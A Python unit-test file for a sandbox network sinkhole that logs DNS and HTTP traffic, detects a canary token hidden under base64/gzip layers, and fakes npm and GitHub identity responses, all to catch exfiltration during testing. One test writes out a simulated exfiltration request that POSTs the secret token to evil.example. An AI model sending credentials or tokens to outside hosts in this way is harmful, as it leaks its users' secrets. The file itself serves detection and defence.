"""mh-sandbox-net's package, on the host: python3 -m unittest discover -s sandbox/tests/net"""
import base64
import gzip
import os
import socket
import sys
import tempfile
import threading
import time
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "net"))

from mhnet import dns, http, services, token  # noqa: E402
from mhnet.log import Log  # noqa: E402
from mhnet.names import Names  # noqa: E402

TOK = b"0123456789abcdef0123"


def dispatcher(log, user=None):
    return services.Dispatcher(services.Context(TOK, Names(log), log, user))


class Records:
    def __init__(self):
        self.rows = []

    def write(self, *f):
        self.rows.append(tuple(str(x) for x in f))


def query(name, qtype=1, qid=b"\x12\x34"):
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    return qid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + q + qtype.to_bytes(2, "big") + b"\x00\x01"


def exchange(raw, answer=None, scheme="http", host="1.2.3.4", log=None):
    """raw sent to the sinkhole's HTTP; what it answered, and the records."""
    log = log or Records()
    answer = answer or dispatcher(log)
    a, b = socket.socketpair()
    t = threading.Thread(target=http.serve, args=(b, scheme, 80, host, log, TOK, answer))
    t.start()
    a.sendall(raw)
    a.shutdown(socket.SHUT_WR)
    t.join()
    b.close()  # as the sinkhole's handler does
    out = b""
    while True:
        c = a.recv(65536)
        if not c:
            break
        out += c
    a.close()
    return out, log.rows


class TokenTest(unittest.TestCase):
    def test_layers(self):
        self.assertTrue(token.carries(b"x=" + TOK, TOK))
        self.assertTrue(token.carries(base64.b64encode(gzip.compress(b"k=" + TOK + b"&" * 40)), TOK))
        self.assertFalse(token.carries(b"nothing here at all" * 10, TOK))

    def test_budget_bounds_a_body_made_to_branch(self):
        # 50 runs of base64, each of 50 runs of base64, each of 50: without
        # a budget, 125000 decodes of the body
        leaf = base64.b64encode(b"A" * 40)
        mid = base64.b64encode(b" ".join([leaf] * 50))
        top = b" ".join([base64.b64encode(b" ".join([mid] * 50))] * 50)
        t = time.monotonic()
        self.assertFalse(token.carries(top, TOK))
        self.assertLess(time.monotonic() - t, 5)

    def test_own_service(self):
        head = b"GET /-/whoami HTTP/1.1\r\nHost: registry.npmjs.org\r\nAuthorization: Bearer " + TOK
        self.assertEqual(token.token_field("registry.npmjs.org", head, b"", TOK), 2)
        self.assertEqual(token.token_field("evil.example", head, b"", TOK), 1)
        self.assertEqual(token.token_field("evil.example", b"GET / HTTP/1.1", b"", TOK), 0)


class DNSTest(unittest.TestCase):
    def test_a_answered_and_written_down(self):
        log = Records()
        out = dns.respond(query("evil.example"), log, Names(log), True)
        self.assertEqual(out[:2], b"\x12\x34")
        self.assertEqual(out[6:8], b"\x00\x01")
        self.assertEqual(out[-4:], bytes([198, 18, 0, 1]))
        self.assertIn(("dns", "A", "evil.example"), log.rows)
        self.assertIn(("addr", "198.18.0.1", "evil.example"), log.rows)

    def test_servfail(self):
        log = Records()
        out = dns.respond(query("evil.example"), log, Names(log), False)
        self.assertEqual(out[3] & 0x0f, 2)

    def test_not_a_query(self):
        log = Records()
        self.assertIsNone(dns.respond(b"\x00" * 5, log, Names(log), True))
        pkt = bytearray(query("x.example"))
        pkt[2] |= 0x80
        self.assertIsNone(dns.respond(bytes(pkt), log, Names(log), True))


class HTTPTest(unittest.TestCase):
    def test_request_written_down(self):
        out, rows = exchange(b"POST /c HTTP/1.1\r\nHost: evil.example\r\nContent-Length: 25\r\n\r\nk=" + TOK + b"xxx")
        self.assertTrue(out.startswith(b"HTTP/1.1 200 OK\r\n"))
        self.assertIn(b"\r\nDate: ", out)
        self.assertIn(b"\r\nServer: nginx\r\n", out)
        self.assertEqual(rows[0][:8], ("http", "http", "POST", "http://evil.example/c", "25", "1", "80", "-"))

    def test_answers(self):
        d = dispatcher(Records(), "dev")
        out, rows = exchange(b"GET /-/whoami HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n", d)
        self.assertIn(b'"username": "dev"', out)
        self.assertEqual(rows[0][7], "npm whoami")
        out, _ = exchange(b"GET /user HTTP/1.1\r\nHost: api.github.com\r\n\r\n", d)
        self.assertIn(b"X-OAuth-Scopes", out)

    def test_answers_only_when_asked(self):
        out, rows = exchange(b"GET /-/whoami HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n")
        self.assertNotIn(b"username", out)
        self.assertEqual(rows[0][7], "-")

    def test_a_drip_is_cut(self):
        old = http.DEADLINE
        http.DEADLINE = 1
        try:
            a, b = socket.socketpair()
            log = Records()
            t = threading.Thread(target=http.serve, args=(b, "http", 80, "h", log, TOK, dispatcher(log)))
            t.start()
            for _ in range(15):
                try:
                    a.sendall(b"G")
                except OSError:
                    break
                time.sleep(0.1)
            t.join(5)
            self.assertFalse(t.is_alive())
            a.close()
            b.close()
        finally:
            http.DEADLINE = old


class LogTest(unittest.TestCase):
    def test_fields_are_one_line(self):
        with tempfile.TemporaryDirectory() as d:
            log = Log(os.path.join(d, "log"))
            log.write("dns", "A", "x")
            with open(os.path.join(d, "log")) as f:
                self.assertEqual(f.read().count("\n"), 1)


if __name__ == "__main__":
    unittest.main()
